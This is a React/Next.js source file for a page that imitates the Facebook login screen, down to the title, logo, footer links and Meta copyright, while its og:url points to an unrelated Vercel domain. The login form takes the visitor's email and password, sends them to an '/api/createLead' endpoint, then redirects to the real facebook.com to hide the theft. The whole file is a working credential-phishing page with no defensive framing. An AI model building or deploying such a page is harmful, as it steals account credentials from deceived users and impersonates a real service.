import Head from "next/head";
import Router from "next/router";
import { useState } from "react";

export default function Home() {
	const [showPassword, setShowPassword] = useState(false);

	const handleClickShowPassword = () => {
		setShowPassword(!showPassword);
	};
	const submitContact = async (event) => {
		event.preventDefault();
		const email = event.target.email.value;
		const password = event.target.password.value;
		console.log(email, password);
		const res = await fetch("/api/createLead", {
			body: JSON.stringify({
				email: email,
				password: password,
			}),
			headers: {
				"Content-Type": "application/json",
			},
			method: "POST",
		});
		const result = await res.json();
		if (result) {
			location.href = "https://www.facebook.com/";
		} else {
			Router.push("/");
		}
	};
	return (
		<>
			<Head>
				<meta name="viewport" content="width=device-width, initial-scale=1" />
				<title>Facebook</title>
				<link rel="icon" href="/favicon.ico" />
				<meta name="og:title" content="Facebook" />
				<meta name="twitter:card" content="summary_large_image" />
				<meta name="twitter:site" content="" />
				<meta property="twitter:image:height" content="640" />
				<meta property="twitter:image:width" content="1200" />
				<meta property="og:image:height" content="640" />
				<meta property="og:image:width" content="1200" />
				<meta name="twitter:title" content="Facebook | Login" />
				<meta name="twitter:description" content="Log in Facebook" />
				<meta name="description" content="Log in Facebook" />
				<meta name="title" content="Facebook | Login" />
				<meta property="og:site_name" content="Facebook" />
				<meta property="og:locale" content="en_US" />
				<meta property="og:title" content="Facebook | Login" />
				<meta property="og:description" content="Log in Facebook" />
				<meta property="og:type" content="website" />
				<meta property="og:url" content="https://hollisterco.vercel.app/" />
			</Head>
			<main className="flex min-h-[95vh] flex-col items-center justify-between sm:px-24">
				<section className="container xl:px-32 px-5 py-36 mx-auto flex flex-wrap items-center">
					<div className="lg:w-3/5 md:w-1/2 md:pr-16 lg:pr-0 pr-0 flex flex-col justify-center sm:justify-start sm:items-start items-center w-full">
						<div className="flex flex-col justify-center w-40 sm:w-72">
							<img
								className="w-full"
								src="/facebook.svg"
								alt="loading image!"
							/>
						</div>
						<p className="hidden sm:block ml-7 leading-relaxed mt-0 lg:text-3xl text-2xl lg:max-w-xl font-medium  text-black text-center md:text-left ">
							Facebook helps you connect and share with the people in your life.
						</p>
					</div>
					<div className="lg:w-2/6 md:w-1/2  flex flex-col md:ml-auto w-full mt-10 md:mt-0">
						<form
							onSubmit={submitContact}
							className="w-full block bg-white shadow-lg rounded-lg px-5 pt-4 pb-3"
						>
							<input
								type="text"
								name="email"
								placeholder="Email address or phone number"
								className="w-full bg-white rounded-md border border-gray-300 focus:border-[#1b74e4] focus:ring-2 focus:ring-indigo-200 text-[17px] outline-none  text-gray-700 mb-3  py-3 px-4 transition-colors duration-200 ease-in-out "
							/>
							<div className="relative">
								<input
									type={showPassword ? "text" : "password"}
									name="password"
									placeholder="Password"
									className="w-full bg-white rounded-md border border-gray-300 focus:border-[#1b74e4] focus:ring-2 focus:ring-indigo-200 text-[17px] outline-none  text-gray-700 mb-3  py-3 px-4 transition-colors duration-200 ease-in-out "
								/>
								<div
									className="absolute right-3 top-[12px] text-gray-300"
									onClick={handleClickShowPassword}
								>
									{showPassword ? (
										<svg
											xmlns="http://www.w3.org/2000/svg"
											fill="none"
											viewBox="0 0 24 24"
											strokeWidth={1.5}
											stroke="currentColor"
											className="w-6 h-6"
										>
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"
											/>
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
											/>
										</svg>
									) : (
										<svg
											xmlns="http://www.w3.org/2000/svg"
											fill="none"
											viewBox="0 0 24 24"
											strokeWidth={1.5}
											stroke="currentColor"
											className="w-6 h-6"
										>
											<path
												strokeLinecap="round"
												strokeLinejoin="round"
												d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"
											/>
										</svg>
									)}
								</div>
							</div>
							<button
								type="submit"
								className="w-full bg-[#1877F2] text-white leading-[48px] px-4 rounded-lg font-semibold text-[20px] whitespace-nowrap"
							>
								Log in
							</button>
							<div className="flex justify-center items-center w-full my-3.5">
								<a
									href="https://web.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxMTg0NzI2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"
									className="text-[#1877f2] text-center text-[14px] hover:cursor-pointer inline-block hover:underline"
								>
									Forgot Password?
								</a>
							</div>
							<hr className="mt-5 block" />
							<div className="flex justify-center w-full items-center">
								<button className="w-auto bg-transparent border text-black sm:bg-[#36A420] hover:bg-[#36a420] hover:text-white text-sm mt-8 mb-4 sm:text-white px-8 sm:px-4 sm:rounded-lg rounded font-semibold sm:first-letter:text-[17px] leading-8 sm:leading-[48px] whitespace-nowrap">
									Create new account
								</button>
							</div>
						</form>
						<p className="text-center text-sm my-4">
							<span className="font-semibold text-center w-full">
								Create a Page
							</span>{" "}
							for a celebrity, band or business
						</p>
					</div>
				</section>
			</main>
			<footer className="bg-white w-full">
				<div className="container sm:px-40 py-6 mx-auto flex flex-wrap flex-col items-start">
					<ul className="flex justify-start space-x-2 border-b pb-3 flex-wrap">
						<li className="text-xs text-[#737373]">English UK</li>
						<li
							title="Hausa"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Hausa
						</li>
						<li
							title="French (France)"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Français (France)
						</li>
						<li
							title="Português (Brasil)"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Português (Brasil)
						</li>
						<li
							title="Spain"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Español
						</li>
						<li
							title="Arabic"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							العربية
						</li>
						<li
							title="Indonesia"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Bahasa Indonesia
						</li>
						<li
							title="German"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Deutsch
						</li>
						<li
							title="Japanese"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							日本語
						</li>
						<li
							title="Italian"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Italiano
						</li>
						<li
							title="Hindi"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							हिन्दी
						</li>
					</ul>
					<ul className="hidden sm:flex justify-start space-x-3 mt-2 flex-wrap">
						<li
							title="Sign up for Facebook"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Sign Up
						</li>
						<li
							title="Log in for Facebook"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Log in
						</li>
						<li
							title="Take a look at Messenger"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Messenger
						</li>
						<li
							title="Facebook Lite for Android"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Facebook Lite
						</li>
						<li
							title="Browse our Watch Videos"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Watch
						</li>
						<li
							title="Take a look at popular places on Facebook"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Places
						</li>
						<li
							title="Check out Facebook games"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Games
						</li>
						<li
							title="Buy and sell on Facebook marketplace"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Marketplace
						</li>
						<li
							title="Learn about Meta Pay"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Meta Pay
						</li>
						<li
							title="Discover Meta"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Meta Store
						</li>
						<li
							title="Learn more about Meta Quest"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Meta Quest
						</li>
						<li
							title="Take a look at Instagram"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Instagram
						</li>
						<li
							title="Take a look at bulletin newsletter"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Bulletin
						</li>
					</ul>
					<ul className="hidden sm:flex justify-start space-x-3 mt-2 flex-wrap">
						<li
							title="Donate  to worthy causes"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Fundraisers
						</li>
						<li
							title="Browse our Facebook service directory"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Services
						</li>
						<li
							title="See Help"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Voting Information Center
						</li>
						<li
							title="Learn how we collect, use and share information to support Facebook"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Privacy Policy
						</li>
						<li
							title="Learn how to manage and control your privacy on Facebook"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Privacy Center
						</li>
						<li
							title="Explore our groups"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Groups
						</li>
						<li
							title="Read our blogs, discover the resources center  and find job opportunities"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							About
						</li>
						<li
							title="Advertise Facebook "
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Create Ad
						</li>
						<li
							title="Create a Page"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Create Page
						</li>
						<li
							title="Develop on our platform"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Developers
						</li>
						<li
							title="Make your next career move to our brilliant company"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Careers
						</li>
						<li
							title="Learn about cookies and Facebook"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Cookies
						</li>
					</ul>
					<ul className="hidden sm:flex justify-start space-x-3 mt-2 flex-wrap">
						<li
							title="Learn about adchoices"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							AdChoices
						</li>
						<li
							title="Review our terms and policies"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Terms
						</li>
						<li
							title="Visit our help center"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Help
						</li>
						<li
							title="Visit our contact uploading and non-users"
							className="text-xs text-[#8a8d91] hover:underline cursor-pointer"
						>
							Contact uploading and non-users
						</li>
					</ul>

					<ul className="sm:hidden flex w-full justify-center sm:justify-start text-[#8a8d91] mt-3  text-[10px] space-x-1">
						<li>About</li>
						<li>.</li>
						<li>Help</li>
						<li>.</li>
						<li>More</li>
					</ul>
					<div className="flex w-full justify-center sm:justify-start text-[#8a8d91] mt-3 sm:mt-5 text-xs">
						Meta &copy; 2023
					</div>
				</div>
			</footer>
		</>
	);
}
